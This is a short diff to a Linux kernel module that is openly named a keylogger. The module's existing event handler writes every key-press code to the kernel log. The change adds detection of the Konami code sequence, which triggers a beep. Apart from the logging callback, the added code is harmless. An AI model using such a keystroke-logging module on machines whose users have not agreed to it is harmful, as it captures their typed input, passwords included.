@@ -31,9 +31,30 @@ static struct input_handler keylogger_handler;
 //     return '\0';  
 // }
 
+
+
+static const unsigned int konami_code[] = {KEY_UP, KEY_UP, KEY_DOWN, KEY_DOWN, KEY_LEFT, KEY_RIGHT, KEY_LEFT, KEY_RIGHT, KEY_B, KEY_A};
+
+static int konami_index = 0;
+
+static void play_beep(void) {
+    printk(KERN_INFO "\a");
+}
+
+
 static void keylogger_event(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
     if (type == EV_KEY && value == 1) { 
         printk(KERN_INFO "Key pressed: %u\n", code);
+
+        if (code == konami_code[konami_index]) {
+            konami_index++;
+            if (konami_index == ARRAY_SIZE(konami_code)) {
+                play_beep();
+                konami_index = 0;
+            }
+        } else {
+            konami_index = 0;
+        }
     }
 
 }
